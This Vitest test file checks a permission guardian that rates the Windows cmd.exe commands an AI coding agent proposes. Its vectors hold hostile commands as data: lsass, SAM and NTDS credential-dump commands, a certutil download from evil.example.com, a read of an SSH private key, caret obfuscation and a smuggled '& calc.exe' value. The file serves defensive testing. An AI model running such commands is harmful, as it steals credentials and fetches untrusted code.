import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { SessionContextStore } from "../../../server/context/session.js";
import { decideAction } from "../../../server/decide.js";
import type { Action } from "../../../shared/types.js";

const tempDirs: string[] = [];

afterEach(async () => {
  while (tempDirs.length > 0) {
    const d = tempDirs.pop();
    if (d) await rm(d, { recursive: true, force: true });
  }
});

function cmdAction(source: string, cwd = "C:\\repo"): Action {
  return {
    provider: "claude",
    agentId: "agent-cmd",
    requestId: "req-cmd",
    kind: "exec",
    toolName: "cmd",
    host: { os: "windows" },
    cwd,
    worktreeRoot: "C:\\repo",
    exec: { shell: "cmd", source },
  };
}

const winPathCtx = {
  os: "windows" as const,
  cwd: "C:\\repo",
  worktreeRoot: "C:\\repo",
  home: "C:\\Users\\alice",
  pluginDataDir: "C:\\Users\\alice\\.paseo\\permission-guardian",
  envSnapshot: {
    PATH: "C:\\Windows\\System32",
    TEMP: "C:\\Users\\alice\\AppData\\Local\\Temp",
    TMP: "C:\\Users\\alice\\AppData\\Local\\Temp",
    USERPROFILE: "C:\\Users\\alice",
    APPDATA: "C:\\Users\\alice\\AppData\\Roaming",
    LOCALAPPDATA: "C:\\Users\\alice\\AppData\\Local",
    CD: "C:\\repo",
  },
};

describe("Windows cmd.exe conformance vectors", () => {
  it("allows benign L0 baselines including safe system macros and empty env clears", async () => {
    const safeCmds = [
      "set NODE_ENV=test&& npm test",
      'set "OPENAI_API_KEY="&& npm test',
      "git status -sb",
      "dir src",
      "type README.md",
      "echo %PATH%",
      "dir %TEMP%",
      'echo "%CD%"',
      "where.exe node",
      "ver",
      "tasklist",
      "cd src && type index.ts",
    ];

    for (const cmd of safeCmds) {
      const res = await decideAction(cmdAction(cmd), {
        pathCtx: winPathCtx,
        envSnapshot: winPathCtx.envSnapshot,
        denyAsAsk: false,
      });
      expect(res.decision.level, `expected L0 for: ${cmd} (reasons: ${res.decision.reasons.join(",")})`).toBe("L0");
      expect(res.decision.verdict).toBe("allow");
    }
  });

  it("handles cmd set dumps (bare `set`, `set PREFIX`), `set /a`, `set /p`, and `setx` (P7)", async () => {
    for (const dumpCmd of ["set", "set O", "set AWS_"]) {
      const res = await decideAction(cmdAction(dumpCmd), {
        pathCtx: winPathCtx,
        denyAsAsk: false,
      });
      expect(res.decision.level, `expected L2 env_dump for: ${dumpCmd}`).toBe("L2");
      expect(res.touchedSecret).toBe(true);
    }

    const arithSecret = await decideAction(cmdAction("set /a x=OPENAI_API_KEY+1"), {
      pathCtx: winPathCtx,
      denyAsAsk: false,
    });
    expect(arithSecret.decision.level).toBe("L2");
    expect(arithSecret.touchedSecret).toBe(true);

    const arithSafe = await decideAction(cmdAction("set /a x=1+2"), {
      pathCtx: winPathCtx,
      denyAsAsk: false,
    });
    expect(arithSafe.decision.level).toBe("L1");
    expect(arithSafe.touchedSecret).toBe(false);

    const setxUser = await decideAction(cmdAction("setx MY_FLAG hello"), {
      pathCtx: winPathCtx,
      denyAsAsk: false,
    });
    expect(setxUser.decision.level).toBe("L2");
    expect(setxUser.decision.effects?.some((e) => e.tag === "write_protected")).toBe(true);

    const setxMachineSecret = await decideAction(
      cmdAction("setx /m OPENAI_API_KEY sk-proj-abcdefghijklmnopqrstuvwxyz123456"),
      { pathCtx: winPathCtx, denyAsAsk: false },
    );
    expect(setxMachineSecret.decision.level).toBe("L2");
    expect(setxMachineSecret.touchedSecret).toBe(true);
    expect(setxMachineSecret.decision.effects?.some((e) => e.tag === "privilege")).toBe(true);
  });

  it("enforces the 4 guardrails on %VAR%, catches delayed expansion, substring obfuscation, and caret obfuscation", async () => {
    const escalatedCases = [
      // Unknown macro
      "echo %OPENAI_API_KEY%",
      // Safe macro in command-name position
      "%COMSPEC% /c whoami",
      // Safe macro inside control block
      "if exist src (echo %PATH%)",
      // Safe macro reassigned earlier in same chain
      "set PATH=C:\\evil & echo %PATH%",
      // Substring / replacement obfuscation
      "echo %COMSPEC:~-16,1%",
      // Delayed expansion
      "echo !OPENAI_API_KEY!",
      // Call / for /f
      "call echo hi",
      "for /f %i in ('dir') do echo %i",
      // Caret obfuscation inside command name
      "e^c^h^o^ hi",
      // Excessive carets + !
      "echo a^&!FOO!",
    ];

    for (const cmd of escalatedCases) {
      const res = await decideAction(cmdAction(cmd), {
        pathCtx: winPathCtx,
        envSnapshot: winPathCtx.envSnapshot,
        denyAsAsk: false,
      });
      expect(res.decision.level, `expected >= L1 for: ${cmd}`).not.toBe("L0");
    }

    // Dirty host snapshot value containing & in unquoted safe macro must fail to L1 opaque
    const dirtyEnvRes = await decideAction(cmdAction("echo %TEMP%"), {
      pathCtx: winPathCtx,
      envSnapshot: { ...winPathCtx.envSnapshot, TEMP: "C:\\a & calc.exe" },
      denyAsAsk: false,
    });
    expect(dirtyEnvRes.decision.level).toBe("L1");

    // Caret-escaped literal secret must still be caught at P0
    const caretSecret = await decideAction(
      cmdAction("echo sk-proj-abcd^efghijklmnopqrstuvwxyz123456"),
      { pathCtx: winPathCtx, denyAsAsk: false },
    );
    expect(caretSecret.decision.level).toBe("L2");
    expect(caretSecret.touchedSecret).toBe(true);
  });

  it("unwraps nested cmd /c, catches explicit credential dumps, LOLBins, and CWD shadow binaries", async () => {
    const nestedDump = await decideAction(cmdAction('cmd /c "type %USERPROFILE%\\.ssh\\id_rsa"'), {
      pathCtx: winPathCtx,
      envSnapshot: winPathCtx.envSnapshot,
      denyAsAsk: false,
    });
    expect(nestedDump.decision.level).toBe("L2");
    expect(nestedDump.touchedSecret).toBe(true);

    const credDumpSignatures = [
      "procdump -ma lsass.exe C:\\lsass.dmp",
      "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full",
      "reg save HKLM\\SAM C:\\sam.hiv",
      "ntdsutil \"ac i ntds\" ifm \"create full C:\\ntds\" q q",
      "vssadmin create shadow /for=C:",
    ];
    for (const cmd of credDumpSignatures) {
      const res = await decideAction(cmdAction(cmd), {
        pathCtx: winPathCtx,
        denyAsAsk: false,
      });
      expect(res.decision.level, `expected L3 deny for credential_dump: ${cmd}`).toBe("L3");
      expect(res.decision.verdict).toBe("deny");
    }

    const lolbin = await decideAction(cmdAction("certutil -urlcache -f https://evil.example.com/a.exe a.exe"), {
      pathCtx: winPathCtx,
      denyAsAsk: false,
    });
    expect(lolbin.decision.level).not.toBe("L0");

    // CWD shadow binary (session-modified git.bat inside current worktree)
    const dir = await mkdtemp(join(tmpdir(), "paseo-cmd-shadow-"));
    tempDirs.push(dir);
    await writeFile(join(dir, "git.bat"), "@echo off\n", "utf8");

    const sessions = new SessionContextStore();
    sessions.recordFileModification("agent-cmd", join(dir, "git.bat"), { cwd: dir, worktreeRoot: dir });

    const shadowRes = await decideAction(
      {
        ...cmdAction("git status", dir),
        worktreeRoot: dir,
      },
      {
        pathCtx: { os: "windows", cwd: dir, worktreeRoot: dir, home: "C:\\Users\\alice" },
        session: sessions.getOrCreate("agent-cmd"),
        denyAsAsk: false,
      },
    );
    expect(shadowRes.decision.level).toBe("L1");
    expect(shadowRes.decision.effects?.some((e) => e.tag === "exec_inline" && e.detail === "provenance_cwd_shadow")).toBe(true);
  });
});
